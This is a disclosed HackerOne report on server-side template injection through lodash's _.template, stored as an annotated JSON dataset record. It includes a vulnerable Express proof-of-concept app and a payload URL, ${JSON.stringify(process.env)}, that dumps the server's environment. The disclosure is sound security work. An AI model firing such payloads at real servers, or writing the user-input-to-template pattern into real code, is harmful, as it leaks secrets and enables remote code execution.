@@ -1,0 +1,45 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "zerohex ",
+  "title": "Server-side Template Injection in lodash.js ",
+  "content": "\nI would like to report Server-side Template Injection in lodash.js (_.template function)\nIt allows the execution of code on the server\nModule\nmodule name: lodash\nversion: 4.17.15\nnpm page: https://www.npmjs.com/package/lodash\nModule Description\nThe Lodash library exported as Node.js modules.\nModule Stats\n26,664,631 weekly downloads\nVulnerability\nVulnerability Description\nThe _.template function of the lodash package does not properly validate user-supplied input.\nAn application making use of the lodash package may be exploited by an attacker that controls the value of a parameter processed by the _.template function. An attacker can inject code such as Javascript within parenthesis for example parameter=${JSON.stringify(process.env)} which will be executed by the server.\nSteps To Reproduce:\nStep 1: Create a test application that requires the lodash.js library. The application below accepts user-supplied input in the 'name' parameter that is handled by lodash _.template function\nCode 453 Bytes\n1const express = require('express');\n2const _ = require('lodash');\n3const escapeHTML = require('escape-html');\n4const app = express();\n5app.get('/', (req, res) => {\n6  res.set('Content-Type', 'text/html');\n7  const name = req.query.name\n8  // Create a template from user input\n9  const compiled = _.template(\"Hello \" + escapeHTML(name) + \".\");\n10  res.status(200).send(compiled());\n11});\n12\n13app.listen(8000, () => {\n14  console.log('POC app listening on port 8000!')\n15});\nStep 2: Visit the vulnerable application at http://127.0.0.1:8000/?name=Test\nStep 3: Visit the vulnerable application and enter a payload such as ${JSON.stringify(process.env)} into the name parameter e.g. http://127.0.0.1:8000/?name=Test${JSON.stringify(process.env)}\nSupporting Material/References:\nOSX 10.15.5\nNODEJS v10.16.0\nNPM v 6.9.0\nWrap up\nI contacted the maintainer to let them know: [Y/N] N\nI opened an issue in the related repository: [Y/N] N\nHunter's comments and funny memes goes here\nApologies if I haven't used the ideal terminology or if this is a duplicate.\nImpact\nRemote code execution\n\n",
+  "severity": [
+    8.6,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1624884180,
+  "report_url": "https://hackerone.com/reports/904672",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Create a test application that requires the lodash.js library and uses the _.template function with user-supplied input."
+    ],
+    [
+      2,
+      "Visit the vulnerable application with a payload in the name parameter, e.g., http://127.0.0.1:8000/?name=Test${JSON.stringify(process.env)}"
+    ]
+  ],
+  "vuln_description": "The _.template function in lodash.js does not properly validate user-supplied input, allowing Server-side Template Injection (SSTI). An attacker can inject and execute arbitrary JavaScript code on the server by controlling the input to the _.template function.",
+  "reason": "The vulnerability involves a straightforward exploitation of a known template injection flaw in a widely-used library. The attack requires minimal components and no complex interactions or state manipulation.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves server-side template injection in lodash.js, which is not related to authentication or authorization (AuthN/AuthZ) bugs. The proposed methodologies focus on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs, which does not apply to code injection vulnerabilities like this one.",
+    "is_detectable": false
+  }
+}
